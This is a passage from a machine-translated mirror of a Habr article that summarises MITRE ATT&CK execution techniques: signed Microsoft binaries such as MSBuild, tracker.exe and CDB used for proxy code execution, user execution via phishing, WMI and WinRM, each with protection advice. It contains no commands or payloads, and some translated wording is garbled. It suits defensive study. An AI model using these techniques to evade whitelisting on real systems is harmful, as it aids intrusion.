inherit;">MSBulid</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Is a software creation platform used in Visual Studio. It uses projects in the form of XML files that describe the requirements for building various platforms and configurations. MSBuild from .NET version 4 allows you to insert C # code into an XML project, compile it, and then execute it. MSBulid.exe is signed with a Microsoft digital certificate. </font></font><br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DNX</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> - .Net Execution Environmant (dnx.exe) is a software development kit (development kit) in Visual Studio Enterprise. Dropped since .NET Core CLI in 2016. DNX is not available in standard Windows builds and can only be present on developer hosts when using .Net Core and ASP.NET Core 1.0. Dnx.exe is signed with a digital certificate and can be used to proxy code execution. </font></font><br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RCSI</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- non-interactive command interface for C #, similar to csi.exe. It was introduced in an early version of the Roslyn .Net compiler platform. Rcsi.exe is signed with a Microsoft digital certificate. C # .csx script files can be written and executed using Rcsi.exe on the Windows command line. </font></font><br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WinDbg / CDB</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> is the MS Windows kernel and debugging utility in user-mode. The Microsoft cdb.exe console debugger is also a user-mode debugger. Both utilities can be used as standalone tools. Usually used in software development, reverse engineering and can not be found in conventional Windows systems. Both WinDbg.exe and CDB.exe are signed with a Microsoft digital certificate and can be used to code proxies. </font></font><br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Tracker</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- file tracking utility tracker.exe. </font><font style="vertical-align: inherit;">Included in .NET as part of MSBuild. </font><font style="vertical-align: inherit;">It is used to register calls in the Windows 10 file system. Attackers can use tracker.exe to execute DLLs in various processes. </font><font style="vertical-align: inherit;">Tracker.exe is also signed with a Microsoft certificate. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Protection recommendations:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> All the above files are to be removed from the system if they are not used for their intended purpose by users.</font></font><br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1204"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">User Execution</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">System:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows, Linux, macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Permissions:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> User </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Description:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Attackers can rely on certain user actions in order to take certain actions. This can be direct code execution when a user opens a malicious executable file, delivered as a phishing attachment with an icon and a visible file extension of the document. Sometimes, other techniques can also be used, for example, when a user clicks on a link in a phishing email, which results in exploiting a browser's vulnerability. The ‚Äúuser executable‚Äù technique is often used at other stages of an invasion, for example, when an attacker places a file in a common directory or on the user's desktop, relying on the fact that he ‚Äúclicks‚Äù on it.</font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Protection tips:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Increase user awareness. </font><font style="vertical-align: inherit;">Block download files such as .scr, .exe, .pif, .cpl, etc. </font><font style="vertical-align: inherit;">The use of anti-virus software and the introduction of IPS-systems.</font></font><br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1047"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows Management Instrumentation (WMI)</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">System:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Permissions:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> User, Administrator </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Description:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> WMI is a Windows administration toolkit that provides local and remote access to Windows system components. WMI uses SMB and RPCS (runs on port 135). Attackers can use WMI to interact with local and remote systems, and also as a means to perform many tactical operations, such as gathering information at the stage of discovery and remotely executing files during the ‚Äúliteral movement‚Äù. </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Protection recommendations:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Disabling WMI and RPCS can lead to system instability. </font><font style="vertical-align: inherit;">By default, only administrators can connect to the system remotely via WMI. </font><font style="vertical-align: inherit;">Prevent overlapping rights for administrative and other privileged accounts.</font></font><br><br><h3> <a href="https://attack.mitre.org/wiki/Technique/T1028"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows Remote Management (WinRM)</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">System:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Permissions:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> User, Administrator </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Description:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows Remote Management (WinRM) is the name of the service and protocol that allows the user to interact remotely with the system (for example, starting a file, changing the registry, changing the service. To start, use the winrm command and other programs ., such as PowerShell </font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Advice on protection:</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Disable the WinRM If it is necessary, insulate infrastructure WinRM with separate accounts and permission should be.. </font></font><i><a href="https://docs.microsoft.com/en-us/windows/desktop/winrm/portal"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">recommendations WinRM</font></font></a></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> on configuring authentication methods and use </font><font style="vertical-align: inherit;">randmauerov host to allow access to WinRM only with certain devices.</font></font></div><p>Source: <a href="https://habr.com/ru/post/424027/">https://habr.com/ru/post/424027/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../424017/index.html">Tackling the Difficult: A Roadmap for Effective Collaboration</a></li>
<li><a href="../424019/index.html">Old computer, Windows 7, 1 GB RAM, DirectX 9 video card, Firefox and Internet</a></li>
<li><a href="../424021/index.html">The complexities of self-learning programming and how to overcome them</a></li>
<li><a href="../424023/index.html">Automating the assembly of iOS applications using Fastlane</a></li>
<li><a href="../424025/index.html">Routing in a large application on React</a></li>
<li><a href="../424029/index.html">And again about laziness</a></li>
<li><a href="../424031/index.html">Reactive programming with JAX-RS</a></li>
<li><a href="../424033/index.html">What is it like to do Kotlin: an interview with Andrei Breslav</a></li>
<li><a href="../424035/index.html">2019 - the year Intel stopped</a></li>
<li><a href="../424037/index.html">A quick tour of GraphQL</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>